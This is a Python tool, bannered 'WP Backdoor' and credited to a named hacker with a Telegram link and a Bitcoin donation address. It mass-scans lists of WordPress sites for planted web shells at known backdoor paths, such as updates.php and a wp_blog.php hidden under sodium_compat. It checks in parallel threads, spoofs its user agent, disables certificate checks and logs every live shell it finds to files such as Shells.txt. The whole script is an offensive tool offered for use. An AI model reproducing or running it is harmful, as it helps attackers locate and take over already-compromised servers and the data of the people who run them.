L='clear'
K=input
O='https://'
N='http://'
I=open
E=True
C=print
import sys,requests as D,re
from multiprocessing.dummy import Pool
from colorama import Fore as A
from colorama import init
from pathlib import Path
import sys,time,platform,os,hashlib
from time import sleep
from datetime import datetime
os.system(L)
init(autoreset=E)
P=A.RED
M=A.CYAN
V=A.WHITE
F=A.GREEN
W=A.MAGENTA
os.system('cls'if os.name=='nt'else L)
C("\n _____ ___  ______   _____  _____ \n|_   _/ _ \\ |  ___| |____ ||  _  |\n  | |/ /_\\ \\| |_        / /| |/' |\n  | ||  _  ||  _|       \\ \\|  /| |\n  | || | | || |     .___/ /\\ |_/ /\n  \\_/\\_| |_/\\_|     \\____(_)\\___/ \n  \n   WP Backdoor\n  [Coded By : Professor6T9]\n  Telegram : https://t.me/teamanonforce\n  Donate(BTC): 13TVX684Err4YmkEjp2AzbYgXaftQwq6ge                                                       \n  \n")
D.urllib3.disable_warnings()
G={'Connection':'keep-alive','Cache-Control':'max-age=0','Upgrade-Insecure-Requests':'1','User-Agent':'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9,fr;q=0.8','referer':'www.google.com'}
try:Q=K('Site Lists: ');R=Path(__file__).with_name(Q);S=[A.strip()for A in R.open('r').readlines()]
except IndexError:J=str(sys.argv[0]).split('\\');exit('\n\x1b[1;31m  [!] Enter <'+J[len(J)-1]+'> <your list.txt>')
T=int(K('Threads: '))
def H(site):
	A=site
	if A.startswith(N):A=A.replace(N,'')
	elif A.startswith(O):A=A.replace(O,'')
	else:0
	B=re.compile('(.*)/')
	while re.findall(B,A):C=re.findall(B,A);A=C[0]
	return A
def U(url):
	l='/wp-content/plugins/Cache/Cache.php\n';k='/wp-content/plugins/Cache/Cache.php';j='/wp-content/updates.php\n';i='cfwk.txt';h='<input type="password" name="password">';g='/wp-content/updates.php';f='/wp-admin/css/colors/blue/\n';e='/wp-admin/css/colors/blue/';d='/wp-admin/css/colors/coffee/index.php\n';c='yanz.txt';b='<input type="submit" name="submit" value="  >>">';a='/wp-admin/css/colors/coffee/index.php';Z=' --> {}[Not Found]';Y='[X]';X='/wp-includes/sodium_compat/src/Core/Curve25519/Ge/wp_blog.php\n';W='-rw-r--r--';V='/wp-includes/sodium_compat/src/Core/Curve25519/Ge/wp_blog.php';U=' --> {}[Not Vuln]';T='>>>';S='drwxr-xr-x';R=False;Q='Shells.txt';M='a';L=' --> {}[Found]';K='\x1b[0;32m[X]';J='utf-8';A=url
	try:
		A=N+H(A);B=D.get(A+V,headers=G,allow_redirects=E,timeout=7)
		if W in B.content.decode(J):C(K+A+L.format(F));I(Q,M).write(A+X)
		else:
			A=O+H(A);B=D.get(A+V,headers=G,allow_redirects=E,verify=R,timeout=7)
			if W in B.content.decode(J):C(K+A+L.format(F));I(Q,M).write(A+X)
			else:C(Y+A+Z.format(P))
		A=N+H(A);B=D.get(A+a,headers=G,allow_redirects=E,timeout=7)
		if b in B.content.decode(J):C(K+A+L.format(F));I(c,M).write(A+d)
		else:
			A=O+H(A);B=D.get(A+a,headers=G,allow_redirects=E,verify=R,timeout=7)
			if b in B.content.decode(J):C(K+A+L.format(F));I(c,M).write(A+d)
			else:C(Y+A+Z.format(P))
		A=N+H(A);B=D.get(A+e,headers=G,allow_redirects=E,timeout=7)
		if S in B.content.decode(J):C(K+A+L.format(F));I(Q,M).write(A+f)
		else:
			A=O+H(A);B=D.get(A+e,headers=G,allow_redirects=E,verify=R,timeout=7)
			if S in B.content.decode(J):C(K+A+L.format(F));I(Q,M).write(A+f)
			else:C(T+A+U.format(P))
		A=N+H(A);B=D.get(A+g,headers=G,allow_redirects=E,timeout=7)
		if h in B.content.decode(J):C(K+A+L.format(F));I(i,M).write(A+j)
		else:
			A=O+H(A);B=D.get(A+g,headers=G,allow_redirects=E,verify=R,timeout=7)
			if h in B.content.decode(J):C(K+A+L.format(F));I(i,M).write(A+j)
			else:C(T+A+U.format(P));A=N+H(A)
		B=D.get(A+k,headers=G,allow_redirects=E,timeout=7)
		if S in B.content.decode(J):C(K+A+L.format(F));I(Q,M).write(A+l)
		else:
			A=O+H(A);B=D.get(A+k,headers=G,allow_redirects=E,verify=R,timeout=7)
			if S in B.content.decode(J):C(K+A+L.format(F));I(Q,M).write(A+l)
			else:C(T+A+U.format(P))
	except:C('\x1b[0;31mDNS Error-->'+A+' --> {}[No Response]'.format(P))
B=Pool(T)
B.map(U,S)
B.close()
B.join()
C('\n [!] {}WP Backdoor By Professor6T9'.format(M))